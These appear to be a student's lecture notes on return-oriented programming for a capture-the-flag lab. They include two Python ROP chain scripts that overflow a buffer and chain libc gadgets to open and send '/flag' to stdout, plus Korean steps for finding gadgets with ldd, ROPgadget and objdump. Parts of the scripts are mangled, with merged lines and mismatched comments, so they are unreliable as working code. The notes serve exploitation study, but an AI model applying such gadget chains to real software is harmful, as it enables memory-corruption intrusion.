Gadgets address base and reuse it

ADD REGISTER
1. PUt that value on the stack
2. POP gadget
SKIP REGISTER
1. POP gadget
NOP
1. ret;
	1. Go to next address and next gadget
	2. SKIP and go NEXT
2. nop ret
STACK PIVOTING
1. xchg
	1. EXCHANGE REGISTER VALUE
	2. ATOMIC instruction
	3. exchange RSP
	4. Original space
	5. NO limitation of overflowed stack anymore
2. LOC

syscall instuction
	VERY RARE

OPEN FILE/READ FILE/CHANGE THE OWNER/CHANGE OF THE PERMISSION
> Function call to C library (Systemcall wrapper) -> 

OPEN THE FLAG and print value> [!PDF|] [[L13 Return-oriented Programming.pdf#page=38&selection=0,10,0,11|L13 Return-oriented Programming, p.38]]
> > ,
> 
> STDOUR> [!PDF|] [[L13 Return-oriented Programming.pdf#page=38&selection=0,36,0,40|L13 Return-oriented Programming, p.38]]> [!PDF|] [[L13 Return-oriented Programming.pdf#page=42&selection=40,2,40,6|L13 Return-oriented Programming, p.42]]
> flag
.data section

> > 1000
> 
> OFfset


```
# sendfile64 0x7ffff7ed6100 # open64 0x7ffff7ed0e50  
# .date 0x0000000000404030 p = ''

p += "A"*56  
p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
p += pack('<Q', 0x0000000000404028) # @ .data  
p += pack('<Q', 0x00007ffff7dff174) # pop rax ; ret  
p += '/flag'  
p += pack('<Q', 0x00007ffff7e6b85b) # mov qword ptr [rdi], rax ; ret p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
p += pack('<Q', 0x0000000000000000) # 0  
p += pack('<Q', 0x00007ffff7ed0e50) # open64  
p += pack('<Q', 0x00007ffff7f221e2) # mov rsi, rax ; shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret  
p += pack('<Q', 0x00007ffff7de6b72) # pop rdi ; ret  
p += pack('<Q', 0x0000000000000001) # 1  
p += pack('<Q', 0x00007ffff7edc371) # pop rdx ; pop r12 ; ret  
p += pack('<Q', 0x0000000000000000) # 0  
p += pack('<Q', 0x0000000000000001) # 1  
p += pack('<Q', 0x00007ffff7e5f822) # pop rcx; ret  
p += pack('<Q', 0x0000000000000050) # 80  
p += pack('<Q', 0x00007ffff7ed6100) # sendfile64  
p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
p += pack('<Q', 0x000000000000003c) # 60  
p += pack('<Q', 0x00007ffff7de584d) # syscall  
print p
```

```
#!/usr/bin/env python2 
from struct import pack

# sendfile64 # open64  
# .date  
p = ''

p += "A"*56  
p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
p += pack('<Q', 0x0000000000404028) # @ .data  
p += pack('<Q', 0x00007ffff7dff174) # pop rax ; ret  
p += '/flag' 
p += pack('<Q', 0x00007ffff7e716eb) # mov qword ptr [rdi], rax ; ret p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
p += pack('<Q', 0x0000000000000000) # 0  
p += pack('<Q', 0x000000000010e030) # open64  
#pop rsi ret

p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
p += pack('<Q', 0x0000000000000001) # 3  
p += pack('<Q', 0x00007ffff7f28468) # rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
p += pack('<Q', 0x0000000000000001) # 1  
p += pack('<Q', 0x00007ffff7ee2431) # pop rdx ; pop r12 ; ret  
p += pack('<Q', 0x0000000000000000) # 0  
p += pack('<Q', 0x0000000000000001) # 1  
p += pack('<Q', 0x00007ffff7ee1f6f) # pop rcx ; ret  
p += pack('<Q', 0x0000000000000050) # 80  
p += pack('<Q', 0x00000000001131c0) # sendfile64  
p += pack('<Q', 0x00007ffff7e0a550) # pop rax ; ret  
p += pack('<Q', 0x000000000000003c) # 60  
p += pack('<Q', 0x0000000000118940) # syscall  
print p
```

1. ldd로 확인
```
ctf@bufferoverflow_overflowret4_no_excstack_64:/$ ldd ./bufferoverflow_overflowret4_no_excstack_64 
        linux-vdso.so.1 (0x00007ffff7fcd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc9000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcf000)
```
2. ROPGADGET으로 가젯 찾기
```
python3 ROPgadget/ROPgadget.py --binary ./bufferoverflow_overflowret4_no_excstack_64

python3 ROPgadget/ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6


```
3. objdump로 메모리 주소 확인하기